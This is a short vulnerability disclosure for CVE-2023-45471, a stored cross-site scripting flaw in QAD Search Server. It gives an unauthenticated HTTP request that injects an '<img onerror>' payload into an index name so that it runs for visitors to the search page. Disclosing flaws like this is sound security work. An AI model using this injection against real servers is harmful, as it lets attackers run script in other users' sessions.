**CVE ID**: CVE-2023-45471

**Vulnerability Type**: Cross-Site Scripting (XSS)

**Affected product**: QAD Search Server

**Affected versions**: 1.0.0.315 (confirmed), all prior versions (allegedly)

**Description**: The QAD Search Server is vulnerable to Stored Cross-Site Scripting (XSS) in versions up to, and including, 1.0.0.315 due to insufficient checks on indexes. This makes it possible for unauthenticated attackers to create a new index and inject a malicious web script into its name, that will execute whenever a user accesses the search page.

**Steps to reproduce**:

```
1. Create a new index
2. Type the following name: <img src=x onerror=alert(1)>

GET /search/ui/indexes/add/%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1
Host: <host>:22000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://<host>:22000/search/ui/indexes/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=9862F2D9B9E8A3C7D8F54FF613D55465
Connection: close

3. When a user visits the search page, the malicious JavaScript code will execute on their behalf.
```

**PoC**:

![poc](https://github.com/itsAptx/CVE-2023-45471/assets/62826765/f592e945-95d9-4a03-bac2-a1b4b398f120)

**References**:

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-45471
